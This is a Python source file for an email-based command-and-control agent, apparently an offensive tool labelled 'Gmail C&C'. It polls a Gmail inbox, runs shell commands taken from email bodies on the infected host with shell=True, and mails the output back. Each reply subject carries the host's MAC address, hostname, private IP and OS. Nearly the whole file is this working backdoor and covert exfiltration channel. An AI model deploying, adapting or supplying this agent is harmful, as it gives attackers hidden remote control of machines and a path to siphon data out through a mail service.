import imaplib
import email
import time
import subprocess
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import socket
import platform
import uuid
import subprocess
from email.utils import parsedate_to_datetime
from datetime import datetime
import pytz

def show_banner():
    print(r"""
  ____                 _ _    ____ ___    ____  
 / ___|_ __ ___   __ _(_) |  / ___( _ )  / ___| 
| |  _| '_ ` _ \ / _` | | | | |   / _ \/\ |     
| |_| | | | | | | (_| | | | | |__| (_>  < |___  
 \____|_| |_| |_|\__,_|_|_|  \____\___/\/\____|

=============================================
             Author: Giuseppe Longobardi
             website: www.phoenixnetacad.com
    """)
show_banner()

italia_tz = pytz.timezone('Europe/Rome')
start_datetime = datetime.now(italia_tz)
start_date = start_datetime.date()
start_date_str = start_date.strftime("%d-%b-%Y")

# Inserisci qui le tue credenziali e impostazioni
email_sorgente = ""
email_destinatario = ''
app_password = ""
indirizzo_filtro = ""
oggetto = 'Response'

# Inizializza un set vuoto per tenere traccia degli ID dei messaggi già letti
messaggi_letti = set()
# Autenticazione
# Ottiene l'indirizzo MAC

def get_mac_address():
    mac_address = uuid.UUID(int=uuid.getnode()).hex[-12:]
    return ":".join([mac_address[i:i+2] for i in range(0, 11, 2)])

def convert_mac_format(mac_address_with_dash):
    # Sostituisci ogni trattino '-' con due punti ':'
    mac_address_with_colon = mac_address_with_dash.replace('-', ':')
    return mac_address_with_colon

# Ottiene l'hostname
def get_hostname():
    return socket.gethostname()

# Ottiene l'indirizzo IP privato
def get_private_ip():
    return socket.gethostbyname(socket.gethostname())

# Ottiene il sistema operativo (uname)
def get_os():
    return platform.uname().system

mac_address = get_mac_address()
mac_address = convert_mac_format(mac_address)
hostname = get_hostname()
private_ip = get_private_ip()
os_info = get_os().lower()
group = "default"

def esegui_comando(comando):
    try:
        result = subprocess.run(comando, capture_output=True, text=True, check=True, shell=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error in command execution: {e}"

# Invio Feedback comandi
def invia_messaggio(testo_messaggio, id_comando):

    messaggio = MIMEMultipart()
    messaggio['From'] = email_sorgente
    messaggio['To'] = email_destinatario
    messaggio['Subject'] = oggetto + '_' + str(id_comando) + '_' + str(mac_address)+ '_' + str(hostname)+ '_' + str(private_ip) + '_' + str(os_info)

    messaggio.attach(MIMEText(testo_messaggio, 'plain'))

    # Invio del messaggio
    server.sendmail(email_sorgente, email_destinatario, messaggio.as_string())

def get_parameters_from_email(input_string, position):
    # Divide la stringa in ingresso in una lista, utilizzando '_' come separatore
    words = input_string.split("_")
    
    # Controlla se la posizione richiesta è valida
    if position <= 0 or position > len(words):
        return "Index not valid."
    
    # Restituisce la parola alla posizione specificata, ricordando che l'indicizzazione delle liste in Python inizia da 0
    return words[position - 1]

while True:
    # Avvia sessione SMTP over TLS
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    mail = imaplib.IMAP4_SSL("imap.gmail.com")
    mail.login(email_sorgente, app_password)
    mail.select("inbox")
    server.login(email_sorgente, app_password)

    # Esegui una ricerca IMAP per ottenere solo i messaggi inviati dopo la data specificata
    status, messages = mail.search(None, f'(SINCE "{start_date_str}")')
    if status != "OK":
        print("Research Error.")
        exit()

    # Ottieni la lista degli id dei messaggi
    message_ids = messages[0].split()

    # Scorri tutti gli ID dei messaggi
    # ... (parte precedente del codice rimane invariata)

# Scorri tutti gli ID dei messaggi
    for email_id in message_ids:
        if email_id in messaggi_letti:
            continue
        # Fetch del messaggio per ID
        status, message_data = mail.fetch(email_id, "(RFC822)")
        if status != "OK":
            print("Fetching Error.")
            continue

        # Estrai il corpo del messaggio
        raw_email = message_data[0][1]
        msg = email.message_from_bytes(raw_email)

        # Estrai e converte la data del messaggio
        date_string = msg["Date"]
        date_time_obj = parsedate_to_datetime(date_string).astimezone(italia_tz)
        
        # Filtra i messaggi in base alla data e all'ora
        if date_time_obj.replace(tzinfo=None) > start_datetime.replace(tzinfo=None):
            raw_email = message_data[0][1]

            msg = email.message_from_bytes(raw_email)

            subject_email = msg["Subject"]
            id_comando = get_parameters_from_email(subject_email,2)
            msg_target_os = get_parameters_from_email(subject_email,3).lower()
            msg_communication_type = get_parameters_from_email(subject_email,4).lower()
            #It could be either a mac address or a group name, it depends on the communication type
            msg_destination_id = get_parameters_from_email(subject_email,5).lower()

            if msg_communication_type == "unicast":
                msg_destination_id = convert_mac_format(msg_destination_id)

            # Verifica l'indirizzo email del mittente
            from_address = msg["From"]
            if indirizzo_filtro not in from_address:
                continue

            if msg_target_os != os_info:
                continue

            #if msg communication type is not unicast and msg destination is not the mac of the machine drop the mail
            if msg_communication_type == "unicast" and msg_destination_id != mac_address:
                continue
            
            if msg_communication_type == "multicast" and msg_destination_id != group:
                continue

            # Estrai e stampa il corpo del messaggio
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        try:
                            body = part.get_payload(decode=True)
                            print("Command received:", body.decode("utf-8"))
                            output = esegui_comando(body.decode("utf-8"))
                            invia_messaggio(output,id_comando)
                            print("Command n°",id_comando," executed and feedback sent\n")
                            messaggi_letti.add(email_id)
                        except:
                            print("Error in command execution\n")
            else:
                body = msg.get_payload(decode=True)
                print("Command received:", body.decode("utf-8"))
                #Will be developed
    time.sleep(10)

